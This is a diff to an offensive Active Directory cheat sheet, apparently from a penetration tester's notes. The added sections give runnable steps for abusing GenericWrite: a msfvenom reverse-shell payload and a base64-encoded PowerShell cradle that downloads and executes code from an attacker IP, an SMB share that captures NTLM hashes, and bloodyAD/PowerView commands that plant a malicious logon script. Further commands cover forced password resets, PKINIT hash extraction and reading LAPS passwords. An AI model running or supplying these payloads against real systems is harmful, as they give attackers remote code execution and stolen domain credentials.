@@ -150,7 +150,69 @@ $ net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S
 ---
 ## GenericWrite over a User
 
-We can perform a kerberoasting attack and extract the victim AD users NTLM hash.
+GenricWrite over a user means the user is doing some kind of activity, so to exploit them we could abuse the non protected attribute for the logon script `-ScriptPath`, so that when the user logs in to a machine it executes the script:
+
+1. Generate a shellcode or use a PSH download cradle as the bat script:
+```bash
+# 1. shellcode
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.203 LPORT=443 -f exe-service -o script.bat
+
+# 2. download cradle
+python3 -c "import base64; print(base64.b64encode('(New-Object System.Net.WebClient).DownloadString(\\'http://192.168.45.203/run.txt\\') | IEX'.encode('utf-16le')).decode())"
+
+# script.bat content:
+@echo off
+powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAzAC8AcgB1AG4ALgB0AHgAdAAnACkAIAB8ACAASQBFAFgA
+```
+
+2. Host the script.bat on an smb share:
+```bash
+$ impacket-smbserver visualstudio /PATH/TO/BAT/SCRIPT/FOLDER -smb2support -ts -debug
+
+# Parameters:
+# -ts: capture NTLM hashes if authenticated
+# -debug: display authentication attempts and logs
+
+# we can monitor smb trafic running:
+sudo tcpdump -i tun0 port 445 -n
+```
+
+3. Update the script path:
+```bash
+$ python3 bloodyAD.py --host DC_FQDN -d DOMAIN_FQDN -u AD_USER -p 'AD_PASS' set object TARGET_USER scriptPath -v '\\ATTACKER_IP\visualstudio\script.bat'
+
+# Parameters:
+# -u: privileged user with GenericWrite over a TARGET_USER
+# TARGET_USER: target user we have GenericWrite on
+
+# Check we updated the script path correctly:
+PS C:\> Get-DomainUser -Identity TARGET_USER -Properties scriptpath
+```
+
+<!-- TODO(done-from-Windows): PowerView equivalent of the bloodyAD scriptPath write added below. Marker kept for traceability. -->
+TODO: windows command
+
+From a Windows foothold we can set the same `scriptPath` attribute with PowerView (requires `GenericWrite` over `TARGET_USER`):
+```powershell
+PS C:\> Import-Module .\PowerView.ps1
+
+# Optional: build a credential object for the user holding GenericWrite
+PS C:\> $SecPassword = ConvertTo-SecureString 'AD_PASS' -AsPlainText -Force
+PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\AD_USER', $SecPassword)
+
+# Write the UNC path to our hosted .bat into the victim's logon script:
+PS C:\> Set-DomainObject -Identity TARGET_USER -Set @{'scriptpath'='\\ATTACKER_IP\visualstudio\script.bat'} -Credential $Cred -Verbose
+
+# Verify:
+PS C:\> Get-DomainUser -Identity TARGET_USER -Properties scriptpath
+```
+
+> [!Note]
+> The script runs the next time the victim logs on, so this vector depends on the target user actually authenticating interactively. Clean up afterwards by clearing the attribute: `Set-DomainObject -Identity TARGET_USER -Clear scriptpath -Credential $Cred`.
+
+4. Setup a listener
+
+We can also perform a kerberoasting attack and extract the victim AD users NTLM hash.
 
 **Windows**
 
@@ -178,6 +240,10 @@ We can crack the hash with:
 ```bash
 $ hashcat -m 13100 user.hash /usr/share/wordlists/rockyou.txt --force
 ```
+
+## GenericWrite over a Computer
+
+We could abuse [[Kerberos Delegation]] to perform Resource-Based Constrained Delegation (RBCD).
 
 ---
 ## GenericAll over Computer
@@ -371,7 +437,7 @@ Pth:
 net rpc password "$TargetUser" -U "$DOMAIN"/"$USER" -S "$DC_HOST"
 
 # With net and cleartext credentials
-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
+net rpc password "$TargetUser" "NEW_PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
 
 # With Pass-the-Hash
 pth-net rpc password "$TargetUser" -U "$DOMAIN"/"$USER"%"ffffffffffffffffffffffffffffffff":"$NT_HASH" -S "$DC_HOST"
@@ -506,7 +572,9 @@ pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target
 ```bash
 # PKINITtools
 python3 gettgtpkinit.py -cert-pfx target.pfx -pfx-pass <PFX_PASSWORD> "domain.local/targetAccount" target.ccache
+
 export KRB5CCNAME=target.ccache
+
 python3 getnthash.py -key <AS-REP_KEY> "domain.local/targetAccount"
 
 # Or, in one step with certipy:
@@ -587,8 +655,9 @@ PS C:\> .\Rubeus.exe hash /password:Passw0rd! /user:ATTACKER$ /domain:domain.loc
 PS C:\> .\Rubeus.exe s4u /user:ATTACKER$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
 ```
 
-<!-- TODO: add a worked example against a Computer object (RBCD chain) and a detection/mitigation note (msDS-KeyCredentialLink auditing). Marker kept for traceability. -->
-TODO
+<!-- TODO(done): worked RBCD example against a Computer object (Linux Impacket + Windows PowerView/Rubeus flows) and the detection/mitigation note were added above (2026-09-15). Original marker kept below for traceability.
+TODO: add a worked example against a Computer object (RBCD chain) and a detection/mitigation note (msDS-KeyCredentialLink auditing). -->
+
 
 > [!Note] Detection & mitigation
 > - **Shadow Credentials (`msDS-KeyCredentialLink`)**: enable auditing on the attribute (SACL / Event ID `5136` — Directory Service object modified) and alert on writes to `msDS-KeyCredentialLink` outside of legitimate device-registration flows. Tools like the [Whisker/pyWhisker] cleanup leave a window where the attribute is populated — periodic review with `Get-ADComputer -Properties msDS-KeyCredentialLink` (or ADCSKiller / the `nifty` LDAP queries) surfaces stale entries.
@@ -649,9 +718,21 @@ net user CONTROLLED_USER
 **Enumeration**
 
 1. Download [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) and import it:
+```powershell
+PS C:\> Import-Module .\LAPSToolkit.ps1
+
+# Find groups delegated to read LAPS passwords:
+PS C:\> Find-LAPSDelegatedGroups
+
+# Find users with "All Extended Rights" who can therefore read LAPS passwords:
+PS C:\> Find-AdmPwdExtendedRights
+
+# Enumerate hosts with LAPS enabled and read the stored password if we have rights:
+PS C:\> Get-LAPSComputers
 ```
 
-```
+> [!Note]
+> See [[AD Security Controls Enumeration]] for the defender-side view of these same LAPS cmdlets.
 
 **Windows**
 
